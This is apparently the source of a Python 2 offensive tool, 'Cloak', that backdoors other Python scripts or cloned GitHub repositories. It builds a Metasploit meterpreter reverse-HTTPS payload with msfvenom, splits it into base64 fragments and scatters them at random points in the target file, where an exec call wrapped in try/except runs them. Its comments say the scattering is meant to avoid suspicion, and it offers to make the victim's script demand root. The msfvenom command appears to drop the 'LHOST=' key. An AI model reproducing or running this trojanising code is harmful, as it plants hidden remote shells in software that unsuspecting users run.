#!/usr/bin/env python2
import os
import random
import socket
import sys
from re import search

# Colors and shit like that
white = '\033[1;97m'
green = '\033[1;32m'
red = '\033[1;31m'
end = '\033[1;m'
info = '\033[1;33m[!]\033[1;m'
que = '\033[1;34m[?]\033[1;m'
bad = '\033[1;31m[-]\033[1;m'
good = '\033[1;32m[+]\033[1;m'
run = '\033[1;97m[>]\033[1;m'

# Banner
print '''%s
    _________  %s__%s                __    
    \%s_%s   ___ \|  |   _________  |  | __
    /    \  \/|  |  /  %s_%s \__  \ |  |/ /
    \     \___|  |_(  %s(_)%s ) %s__%s \|    %s<%s 
     \______  /____/\____(____  /__|_ \\
            %s\/%s                \/     \/%s\n''' % (white, red, white, red, white, red, white, red, white, red, white, red, white, red, white, end)

# Connecting to google DNS and retrieving IP address of host
s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
s.connect(("8.8.8.8", 80))
LHOST = s.getsockname()[0]
s.close()


def check_external_dependency(command, help=None):
    check_msfvenom = os.system('command -v %s > /dev/null' % command)
    if check_msfvenom != 0:
        print '%s%s Couldn\'t find %s!' % (bad, red, command)
        if help:
            print '%s %s' % (info, help)
        sys.exit(1)


check_external_dependency(
    'msfvenom',
    help='See http://bit.ly/2pgJxxj for installation guide'
)

# Prompting the user for LHOST
choice = raw_input('%s %s%s%s : Use this as LHOST? [Y/n] ' % (que, green, LHOST, end)).lower()
if choice == 'n':
    LHOST = raw_input('%s Enter LHOST: ' % que)

# Prompting the user for LPORT
LPORT = '443'
choice = raw_input('%s %s%s%s : Use this as LPORT? [Y/n] ' % (que, green, LPORT, end)).lower()
if choice == 'n':
    LPORT = raw_input('%s Enter LPORT: ' % que)


def import_choice():
    script = raw_input('%s Enter Github/File path: ' % que)
    if 'https://github.com' in script:
        github(script)
    else:
        local(script)


def local(script):
    github = False
    injector(script)


def github(script):
    repo = script
    directory = repo.split('/')[4] # Extracts repo name from github URL
    cwd = os.path.dirname(os.path.abspath(__file__)) # Finds the path of cloak.py
    os.system('git clone %s %s/%s -q' % (repo, cwd, directory)) # clones the repo
    os.system('cd %s && ls > temp.txt' % directory) # Navigate to cloned repo and do ls and store its output in temp.txt
    python_files = [] # we will store the found python files here
    with open('%s/temp.txt' % directory, 'r') as f: # reading tmp.txt
        for line in f:
            if '.py' in line: # if a file contains .py
                python_files.append(line.strip('\n')) # adding the filename to python_files list

    if len(python_files) == 0: # if there are 0 python files
        print '%s No python file found.' % bad

    elif len(python_files) > 1: # if there are more than 1 python files
        print '%s More than one python scripts found.'
        number = 1
        for file in python_files:
            print '%s. %s' % (number, file) # it will print all files like 1. main.py 2. run.py 3. test.py
            number = number + 1
        number = raw_input('%s Select a file to infect: ' % que) # asking the user to select a file to inject
        script = python_files[int(number) - 1] # just simple maths to select the chosen file from python_files list

    elif len(python_files) == 1: # if there's 1 python file
        script = python_files[0] # fetching the only element from the python_files list
    print '%s Payload will be injected in %s%s%s' % (info, green, script, end)
    os.system('rm -r %s/%s/temp.txt' % (cwd, directory)) # removes the temp.txt
    cwd2 = os.chdir('%s/%s' % (cwd, directory)) # changes the working directory to the repo directory
    github = True
    injector(script)


def injector(script):
    method = 'https'
    print '%s Generating Payload' % run
    os.system("msfvenom -p python/meterpreter/reverse_%s -f raw --platform python -e generic/none -a python %s LPORT=%s > payload.txt" % (method, LHOST, LPORT))
    payload = [] # a list containing
    with open('payload.txt', 'r+') as f: # opens payload.txt
        for line in f:
            payload.append(line.strip('\n')) # adds this line to payload list
        f.close() # closes the file
    payload = ''.join(payload) # converts payload list into a string
    payload = payload.split("'") # converts the payload into a list by splitting it from the character '
    base64_string = payload[3] # retireves the third *coughs* the fourth element from the payload list
    print '%s Injecting into %s%s%s' % (run, green, script, end)
    injectable_lines = [] # Lines where payload pieces can be inserted safely
    imports = [] # lines that are being used to import libraries. Perfect for inserting 'import base64, sys'
    script_list = [] # list that contains all the lines of target script
    number = 0 # just a variable that we will be using later
    with open(script, 'r') as f: # opens the target script
        for line in f:
            script_list.append(line.strip('\n')) # adds current line to the script_list
            match = search(r'^[a-zA-Z0-9]', line) # checks if the first character is an alphabet or digit
            match2 = search(r'^[\t]', line)
            if match and not line.startswith('except') and not line.startswith('else') and not match2:
                injectable_lines.append(number - 1) # add the line to injectable_lines list
            if line.startswith('from') or line.startswith('import'): # if the line starts with from or import
                imports.append(number) # add that line to imports list
            else: # If the line doesn't start with tab, space, import, from
                pass
            number = number + 1 # increase the value of number by 1
        f.close() # close the file
    if 'import base64, sys' in script_list: # searches for 'import base64. sys' in script_list
        print '%s Seems like this file has been already injected by Cloak.' % bad
        if github:
            choice = raw_input('%s Would you like to download a fresh copy? [Y/n]' % que).lower()
            if choice == 'n':
                pass
            else:
                os.chdir('%s' % cwd) # changes the working directory to the cloak.py directory
                os.system('rm -r %s' % directory) # removes the older copy of downloaded repo
                os.system('git clone %s %s/%s -q' % (repo, cwd, directory)) # clones the repo
                cwd2 = os.chdir('%s/%s' % (cwd, directory)) # changes the working directory to the repo directory
                injector() # Calls the injector() function
        else:
            print '%s Please use a fresh file for injection.' % info
            quit()
    while True:  # its an infinite loop unless its broken manually
        # We can't insert all the pieces of payload in one place as it may raise suspicion so we will
        # randomly select positions for those positions. random.choice(list) retrieve a random element from list
        position_a, position_b = random.choice(injectable_lines), random.choice(injectable_lines)
        position_c, position_d = random.choice(injectable_lines), random.choice(injectable_lines)
        #lets make sure the positions of the pieces of payload are in a particular order otherwise it will raise error
        if position_a < position_b < position_c < position_d:
            script_list.insert(position_a + 1, 'var1 = \'\'\'%s\'\'\'' % base64_string[:len(base64_string)/2]) #[:len(string)/2] will give the first half of a string
            script_list.insert(position_b + 2, 'var2 = \'\'\'%s\'\'\'' % base64_string[len(base64_string)/2:]) #and insert.list() is used to insert a element in list
            script_list.insert(position_c + 3, 'vars = var1 + var2')
            script_list.insert(position_d + 4, 'try:\n\texec(base64.b64decode({2:str,3:lambda b:bytes(b,\'UTF-8\')}[sys.version_info[0]](vars)))\nexcept:\n\tpass')
            root = raw_input('%s Ask victim to run injected script as root? [y/N] ' % que).lower()
            if root == 'y':
                root = True
            if len(imports) < 1: # if there are no imports in the script
                if root:
                    script_list.insert(injectable_lines[0], 'import base64, sys, commands\nif (sys.platform.startswith("linux")) :\n\tif (commands.getoutput("whoami")) != "root" :\n\t\tprint ("%s needs to be run as root.")\n\t\tsys.exit()\n\telse:\n\t\tpass' % script)
                else:
                    script_list.insert(random.choice(imports), 'import base64, sys')
            else:
                if root:
                    script_list.insert(injectable_lines[0], 'import base64, sys, commands\nif (sys.platform.startswith("linux")) :\n\tif (commands.getoutput("whoami")) != "root" :\n\t\tprint ("%s needs to be run as root.")\n\t\tsys.exit()\n\telse:\n\t\tpass' % script)
                else:
                    script_list.insert(random.choice(imports), 'import base64, sys')
            break # breaks the loop as the payload has been injected
        else:  # if the randomly selected variables are not in ascending order
            pass
    with open(script, 'r+') as f:  # opens the target script
        for line in script_list:
            f.write(line + '\n')  # writes a line to the target script
        f.close() # closes the file
    os.system('rm payload.txt')  # removes payload.txt
    print '%s %s%s%s was successfully injected' % (good, green, script, end)


import_choice()
